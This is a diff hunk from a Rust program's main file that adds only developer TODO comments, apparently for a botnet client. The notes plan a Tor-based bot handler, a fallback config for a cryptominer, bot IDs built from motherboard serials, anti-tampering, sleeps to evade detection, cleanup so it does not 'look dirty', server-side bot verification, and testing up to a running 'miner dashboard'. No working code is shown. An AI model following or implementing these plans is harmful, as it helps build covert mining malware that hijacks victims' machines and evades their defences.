@@ -250,12 +250,15 @@ fn main() {
 //? in tor handler modify to read data read the first data if exists and other native types sent to not error
 //? sparse out pre install
 //? if cannot connect to tor - run prewritten runconfig ( for miner etc ) still needed
-//? code constant id getting
+//? code constant id getting // impl mother board serial and constant ID making and add actual values themselves in the bot handler
 // in logger setup so that we save last log and if identical - we use (count) that repeats - fix for panic and huuuge bug when sizes get too big from some errors too much | somehow else prevent logger for making TOO BIG logs SIZE
 // add better anti tampering
 // code inf cleanup
 // rewrite everything where we get checks as variables and then each call is just a combination of checks, and they are ordered by the order of how we decide
 // improve clean up a little to not look dirty
 // add sleep in between for anti detect
+// fix tor handler logger abomination
+
+//? in server verify bots by regenerating the constant id from botstate values and running some other checks AND if not match just IGNORE the bot - after verification we store its data
 
 //* TEST AND TRY EACH SCENARIO IN VM UP TO RUNNING MINER DASHBOARD FULL
